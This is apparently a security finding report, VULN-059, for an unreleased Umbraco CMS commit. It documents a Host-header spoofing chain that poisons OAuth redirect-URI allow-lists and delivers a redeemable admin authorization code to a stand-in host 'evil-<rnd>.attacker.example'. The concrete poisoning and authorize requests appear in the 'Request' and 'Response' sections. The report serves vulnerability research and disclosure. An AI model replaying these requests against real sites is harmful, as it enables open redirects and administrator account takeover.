# VULN-059 — Host-header → OAuth redirect-URI pollution (open redirect + non-prod ATO)

**Software**: Umbraco CMS
**Repository**: https://github.com/umbraco/Umbraco-CMS
**Affected version**: 18.3.0-rc (version.json; commit-pinned, no tagged release)
**Commit**: `cee7d8981ab0fd18b4dc96449ae071edf1aaf21e`
**Status**: CONFIRMED
**Severity (static)**: High — CVSS 3.1 `8.1` (`AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N`) for the non-Production ATO; Production open-redirect-only ≈ `6.1`.
**Validated at**: 2026-09-29

## Preconditions
- Default config: no `AllowedHosts` (absent from every container appsettings), no `UseForwardedHeaders`/
  `HostFiltering` in `src`, no `WebRouting:UmbracoApplicationUrl` — so `context.Request.Host` is the raw,
  attacker-controlled `Host` header. The spoofed request must reach Kestrel (direct exposure or a
  Host-passing proxy).
- Poisoning is **unauthenticated**. The ATO step needs an already-logged-in admin to load one link
  (`UI:R`); the exploit uses an authenticated admin cookie session to stand in for that lured admin.
- Non-Production instance for the ATO chain (dev clients present). Confirmed live:
  `ASPNETCORE_ENVIRONMENT=Development`.
- A brand-new random `evil-<rnd>.attacker.example` host per run, so the pre-poison rejection is provable
  (the host is guaranteed not yet in the client's redirect-URI set). Persisting a redirect URI is a
  side effect but harmless to other tests (it only *adds* an allowed host).

## Request
See `request.http`.
- Poison (unauthenticated): `GET /umbraco` with header `Host: evil-<rnd>.attacker.example`.
- Post-poison authorize (cookie = lured admin):
  `GET /umbraco/management/api/v1/security/back-office/authorize?client_id=umbraco-swagger&response_type=code&redirect_uri=http://evil-<rnd>.attacker.example/umbraco/openapi/oauth2-redirect.html&code_challenge=<attacker>&code_challenge_method=S256&state=…`

## Response
See `response.txt`, `evidence/pre_vs_post.txt`, `evidence/accepted_redirect.txt`:
- **PRE-POISON**: `/authorize` with the evil `redirect_uri` → **400 invalid_request** ("The specified
  'redirect_uri' is not valid for this client application", OpenIddict ID2043) for **both** `umbraco-back-office`
  and `umbraco-swagger`.
- **POISON**: `GET /umbraco` (Host spoofed) → **200** (no auth).
- **POST-POISON**: the identical `/authorize` now →
  - `umbraco-back-office` → **302** `Location: http://evil-<rnd>.attacker.example/umbraco/oauth_complete?code=[redacted]&…` (open redirect; code redacted for this client).
  - `umbraco-swagger` → **302** `Location: http://evil-<rnd>.attacker.example/umbraco/openapi/oauth2-redirect.html?code=<REAL-CODE>&…` — a real, redeemable admin auth code delivered to the attacker host (**ATO**).

## Observation
Exactly matches the static finding. The redirect-URI allow-list is real (pre-poison 400), and one
unauthenticated `Host`-spoofed request flips the same evil URI to accepted (302 with a code) — because
`BackOfficeAuthorizationInitializationMiddleware.cs:74` grows the client's redirect set from the raw Host
header and `BackOfficeApplicationManager.cs:96-98` checks only `IsAbsoluteUri`. The swagger dev client's code
is not redacted (`HideBackOfficeTokensHandler` gates redaction on `ClientId == umbraco-back-office`), so the
non-Production ATO is real.

## Side effects
- Persistently adds `http://evil-<rnd>.attacker.example` (random per run) to the backoffice/swagger clients'
  RedirectUris/PostLogoutRedirectUris in `umbracoOpenIddictApplications`. Additive only; does not remove or
  alter the legitimate `localhost` entry. Not cleaned up (there is no unauth API to remove it; harmless).

## Research & references
- No matching public advisory — the code path is acknowledged only as a functional load-balancing issue
  ([issue #21138](https://github.com/umbraco/Umbraco-CMS/issues/21138); the planned fix *accumulates* hosts,
  matching the cumulative behaviour). The one Umbraco open-redirect CVE
  ([CVE-2024-34071 / GHSA-j74q-mv2c-rxmp](https://github.com/advisories/GHSA-j74q-mv2c-rxmp)) is a different
  (`returnUrl`) path. Corrects the stage-02 negative "OAuth `redirect_uri` is exact-match from configured hosts".
- OWASP — Unvalidated Redirects and Forwards Cheat Sheet; OAuth 2.0 Security BCP (RFC 9700) — exact
  `redirect_uri` matching and host-header hardening.

## If FAILED
n/a — CONFIRMED. If the baseline does **not** return 400, the chosen `evil` host was already poisoned by a
prior run — the exploit uses a fresh random host each run to avoid this; simply re-run.
